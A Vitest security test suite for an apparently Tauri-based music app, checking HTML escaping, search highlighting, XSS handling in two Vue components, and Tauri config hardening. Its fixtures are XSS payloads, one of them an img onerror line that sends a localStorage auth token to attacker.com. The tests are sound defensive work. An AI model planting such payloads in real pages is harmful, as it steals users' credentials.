/**
 * Security Test Suite: TASK-89 / SEC-005
 * Validates HTML sanitization, XSS mitigation in search/command palettes,
 * and strict disabling of withGlobalTauri in Tauri configuration.
 */
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { mount, flushPromises } from '@vue/test-utils'
import fs from 'node:fs'
import path from 'node:path'
import { escapeHtml, escapeRegex, escapeRegExp, highlightMatch } from '@/utils/sanitize'
import CommandPalette from '@/components/CommandPalette.vue'
import HelpPanel from '@/components/HelpPanel.vue'
import * as libraryApi from '@/api/library'

vi.mock('vue-router', () => ({
  useRouter: () => ({
    push: vi.fn(),
  }),
}))

vi.mock('@/api/library', () => ({
  searchTracks: vi.fn(),
}))

describe('TASK-89 / SEC-005: Security Sanitization & Tauri Hardening', () => {
  describe('1. HTML Entity Escaping (escapeHtml)', () => {
    it('neutralizes malicious <script> tags and executable scripts', () => {
      const payload = "<script>alert('XSS')</script>"
      const sanitized = escapeHtml(payload)
      expect(sanitized).toBe('&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;')
      expect(sanitized).not.toContain('<script>')
      expect(sanitized).not.toContain('</script>')
    })

    it('neutralizes <img> with onerror payloads by escaping tag delimiters into entities', () => {
      const payload = '<img src="invalid" onerror="fetch(\'https://attacker.com/steal?token=\' + localStorage.getItem(\'auth\'))">'
      const sanitized = escapeHtml(payload)
      expect(sanitized).not.toContain('<img')
      expect(sanitized).toContain('&lt;img')
      expect(sanitized).toContain('&quot;')
      expect(sanitized).toContain('&#39;')
    })

    it('neutralizes dangerous HTML attributes and control characters (&, <, >, ", \')', () => {
      const input = '<div class="alert" data-val=\'test\' & "quotes">'
      const escaped = escapeHtml(input)
      expect(escaped).toBe('&lt;div class=&quot;alert&quot; data-val=&#39;test&#39; &amp; &quot;quotes&quot;&gt;')
      expect(escaped).not.toContain('<')
      expect(escaped).not.toContain('>')
      expect(escaped).not.toContain('"')
      expect(escaped).not.toContain("'")
    })

    it('neutralizes SVG and iframe vector injections', () => {
      const svg = '<svg onload="alert(document.domain)">'
      const iframe = '<iframe src="javascript:alert(1)"></iframe>'
      expect(escapeHtml(svg)).toBe('&lt;svg onload=&quot;alert(document.domain)&quot;&gt;')
      expect(escapeHtml(iframe)).toBe('&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;')
    })

    it('handles empty strings, nullish values, and non-string inputs safely without throwing', () => {
      expect(escapeHtml('')).toBe('')
      expect(escapeHtml(null)).toBe('')
      expect(escapeHtml(undefined)).toBe('')
      expect(escapeHtml(0 as unknown as string)).toBe('0')
    })
  })

  describe('2. Safe Search Highlighting (highlightMatch)', () => {
    it('wraps matching text in <mark> without unescaping malicious HTML in source text', () => {
      const maliciousTitle = '<img src=x onerror=alert(1)> Bohemian Rhapsody'
      const highlighted = highlightMatch(maliciousTitle, 'Bohemian')

      // Must escape dangerous tags
      expect(highlighted).toContain('&lt;img src=x onerror=alert(1)&gt;')
      expect(highlighted).not.toMatch(/<img\s+src=x/i)

      // Must safely wrap match in mark tag
      expect(highlighted).toContain('<mark class="bg-yellow-200 dark:bg-yellow-500/30 rounded px-0.5">Bohemian</mark>')
    })

    it('prevents HTML injection through the search query itself', () => {
      const title = 'Normal Song Title'
      const maliciousQuery = '<script>alert(1)</script>'
      const highlighted = highlightMatch(title, maliciousQuery)

      expect(highlighted).not.toContain('<script>')
      expect(highlighted).not.toContain('</script>')
      expect(highlighted).toBe('Normal Song Title')
    })

    it('correctly matches and escapes when query matches HTML-like strings in escaped text', () => {
      const title = 'Track with <tag> in name'
      const query = '<tag>'
      const highlighted = highlightMatch(title, query)

      // The match must be escaped and wrapped in mark
      expect(highlighted).toContain('<mark class="bg-yellow-200 dark:bg-yellow-500/30 rounded px-0.5">&lt;tag&gt;</mark>')
      expect(highlighted).not.toContain('<tag>')
    })

    it('handles regex special metacharacters without throwing SyntaxError or ReDoS', () => {
      const text = 'Track [Special Edition] (feat. Artist) + Bonus & More \\ C:\\'
      const dangerousQueries = ['[', ']', '*', '+', '(', ')', '?', '\\', '^', '$', '{', '}', '|', '[a-z', '.*']

      for (const q of dangerousQueries) {
        expect(() => highlightMatch(text, q)).not.toThrow()
        const res = highlightMatch(text, q)
        expect(typeof res).toBe('string')
      }
    })

    it('returns escaped text when query is empty or whitespace', () => {
      const text = '<script>alert("test")</script>'
      expect(highlightMatch(text, '')).toBe('&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt;')
      expect(highlightMatch(text, '   ')).toBe('&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt;')
    })
  })

  describe('3. Component XSS Neutralization (CommandPalette & HelpPanel)', () => {
    beforeEach(() => {
      vi.clearAllMocks()
      document.body.innerHTML = ''
    })

    afterEach(() => {
      document.body.innerHTML = ''
    })

    it('CommandPalette: renders escaped HTML when search results contain malicious track titles', async () => {
      const maliciousTrack = {
        id: 99,
        title: '<img src=x onerror=alert("XSS_CMD_PALETTE")>Cyberpunk',
        artist: '<script>alert(2)</script>',
        album: 'Attack Vector',
        duration_secs: 200,
        service: 'qobuz',
        quality: 'Hi-Res',
      }

      vi.mocked(libraryApi.searchTracks).mockResolvedValue({
        tracks: [maliciousTrack as any],
        total: 1,
        offset: 0,
        limit: 10,
        has_more: false,
      })

      const wrapper = mount(CommandPalette, {
        attachTo: document.body,
      })

      wrapper.vm.open()
      await flushPromises()

      const input = document.body.querySelector('input')
      expect(input).not.toBeNull()
      input!.value = 'Cyberpunk'
      input!.dispatchEvent(new Event('input'))
      await flushPromises()

      // Wait for debounce timer
      await new Promise((resolve) => setTimeout(resolve, 350))
      await flushPromises()

      const html = document.body.innerHTML
      // Verify no executable image or script tags exist in DOM
      expect(document.body.querySelectorAll('img').length).toBe(0)
      expect(document.body.querySelectorAll('script').length).toBe(0)
      expect(html).not.toMatch(/<img\s+src=x/i)
      expect(html).not.toContain('<script>')
      // Verify entities are safely rendered as text content, not executable tags
      expect(html).toContain('&lt;img src=x onerror=alert')
      expect(html).toContain('<mark class="bg-yellow-200 dark:bg-yellow-500/30 rounded px-0.5">Cyberpunk</mark>')

      wrapper.unmount()
    })

    it('HelpPanel: highlightMatch neutralizes XSS payloads in FAQ and article titles', async () => {
      const wrapper = mount(HelpPanel, {
        attachTo: document.body,
      })

      wrapper.vm.open()
      await flushPromises()

      // Verify highlightMatch is exposed or callable safely
      const testHtml = (wrapper.vm as any).highlightMatch('<script>alert("help")</script>')
      expect(testHtml).not.toContain('<script>')
      expect(testHtml).toContain('&lt;script&gt;')

      wrapper.unmount()
    })
  })

  describe('4. Tauri Configuration Hardening (SEC-005 / tauri.conf.json)', () => {
    const tauriConfPath = path.resolve(__dirname, '../../../../src-tauri/tauri.conf.json')

    it('strictly disables withGlobalTauri to prevent window.__TAURI__ exposure and RCE', () => {
      expect(fs.existsSync(tauriConfPath)).toBe(true)
      const content = fs.readFileSync(tauriConfPath, 'utf-8')
      const config = JSON.parse(content)

      // Strict check: withGlobalTauri must be explicitly false
      expect(config.app).toBeDefined()
      expect(config.app.withGlobalTauri).toBe(false)
    })

    it('enforces robust Content Security Policy in tauri.conf.json', () => {
      const content = fs.readFileSync(tauriConfPath, 'utf-8')
      const config = JSON.parse(content)

      const csp = config.app?.security?.csp
      expect(csp).toBeDefined()
      expect(csp).toContain("default-src 'self'")
      expect(csp).toContain("object-src 'none'")
      expect(csp).toContain("base-uri 'self'")
    })
  })
})
